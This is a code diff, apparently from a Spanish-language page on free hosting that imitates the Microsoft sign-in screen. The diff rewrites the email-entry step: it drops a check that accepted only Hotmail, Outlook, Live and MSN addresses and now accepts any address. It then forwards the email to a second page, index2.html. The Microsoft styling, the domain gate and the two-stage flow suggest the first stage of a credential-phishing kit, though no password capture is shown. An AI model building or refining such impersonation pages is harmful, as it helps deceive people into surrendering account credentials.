@@ -254,92 +254,75 @@
     <script src="xjsx.js"></script>
     
     <script>
-      // Dominios de Microsoft permitidos
-      const allowedDomains = [
-        'hotmail.com', 'hotmail.es', 'hotmail.co.uk', 'hotmail.fr', 'hotmail.de', 'hotmail.it',
-        'outlook.com', 'outlook.es', 'outlook.co.uk', 'outlook.fr', 'outlook.de', 'outlook.it',
-        'live.com', 'live.es', 'live.co.uk', 'live.fr', 'live.de', 'live.it',
-        'msn.com'
-      ];
-      
-      function validateMicrosoftDomain(email) {
-        const domain = email.split('@')[1];
-        return domain && allowedDomains.includes(domain.toLowerCase());
-      }
-      
-      function showError() {
-        const errorMessage = document.getElementById('errorMessage');
-        const emailInput = document.getElementById('email');
-        const form = document.getElementById('emailForm');
-        
-        // Mostrar mensaje de error
-        errorMessage.classList.remove('hidden');
-        
-        // Cambiar estilo del input
-        emailInput.classList.remove('ms-input');
-        emailInput.classList.add('ms-input-error');
-        
-        // Agregar efecto de shake
-        form.classList.add('error-shake');
-        setTimeout(() => {
-          form.classList.remove('error-shake');
-        }, 500);
-      }
-      
-      function hideError() {
-        const errorMessage = document.getElementById('errorMessage');
-        const emailInput = document.getElementById('email');
-        
-        // Ocultar mensaje de error
-        errorMessage.classList.add('hidden');
-        
-        // Restaurar estilo del input
-        emailInput.classList.remove('ms-input-error');
-        emailInput.classList.add('ms-input');
-      }
-      
-      function handleEmailSubmit(event) {
-        event.preventDefault();
-        
-        // Prevenir múltiples envíos
-        const submitButton = event.target.querySelector('button[type="submit"]');
-        if (submitButton.disabled) {
-          return;
-        }
-        
-        const email = document.getElementById('email').value.trim();
-        
-        if (email) {
-          // Deshabilitar botón inmediatamente
-          submitButton.disabled = true;
-          submitButton.textContent = 'Verificando...';
-          
-          // Validar dominio de Microsoft
-          if (!validateMicrosoftDomain(email)) {
-            // Re-habilitar botón si hay error
-            submitButton.disabled = false;
-            submitButton.textContent = 'Siguiente';
-            showError();
-            return;
-          }
-          
-          // Si es válido, continuar
-          window.location.href = `index2.html?email=${encodeURIComponent(email)}`;
-        }
-      }
-      
-      // Ocultar error cuando el usuario empiece a escribir
-      document.getElementById('email').addEventListener('input', function() {
-        if (this.value.length > 0) {
-          hideError();
-        }
-      });
-      
-      // También ocultar error cuando el input reciba focus
-      document.getElementById('email').addEventListener('focus', function() {
-        hideError();
-      });
-    </script>
+  function showError() {
+    const errorMessage = document.getElementById('errorMessage');
+    const emailInput = document.getElementById('email');
+    const form = document.getElementById('emailForm');
+
+    errorMessage.classList.remove('hidden');
+
+    emailInput.classList.remove('ms-input');
+    emailInput.classList.add('ms-input-error');
+
+    form.classList.add('error-shake');
+    setTimeout(() => {
+      form.classList.remove('error-shake');
+    }, 500);
+  }
+
+  function hideError() {
+    const errorMessage = document.getElementById('errorMessage');
+    const emailInput = document.getElementById('email');
+
+    errorMessage.classList.add('hidden');
+
+    emailInput.classList.remove('ms-input-error');
+    emailInput.classList.add('ms-input');
+  }
+
+  function handleEmailSubmit(event) {
+    event.preventDefault();
+
+    const submitButton =
+      event.target.querySelector('button[type="submit"]');
+
+    if (submitButton.disabled) {
+      return;
+    }
+
+    const email = document.getElementById('email').value.trim();
+
+    if (!email) {
+      showError();
+      return;
+    }
+
+    // Acepta cualquier dominio.
+    // Solo comprobamos que tenga una estructura básica de correo.
+    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+    if (!emailPattern.test(email)) {
+      showError();
+      return;
+    }
+
+    submitButton.disabled = true;
+    submitButton.textContent = 'Verificando...';
+
+    window.location.href =
+      `index2.html?email=${encodeURIComponent(email)}`;
+  }
+
+  document.getElementById('email').addEventListener('input', function () {
+    if (this.value.length > 0) {
+      hideError();
+    }
+  });
+
+  document.getElementById('email').addEventListener('focus', function () {
+    hideError();
+  });
+</script>
   <!-- Inserted by miarroba -->
 </script></noframes></noembed></noscript><script type="text/javascript" src="/hosting__contador__visitas__unicas.php?h=2201685&amp;t=1759878497&amp;k=836fc5a243382e506f51f4d3de6342d7&amp;__muid="></script>
 <!-- Inserted by miarroba -->
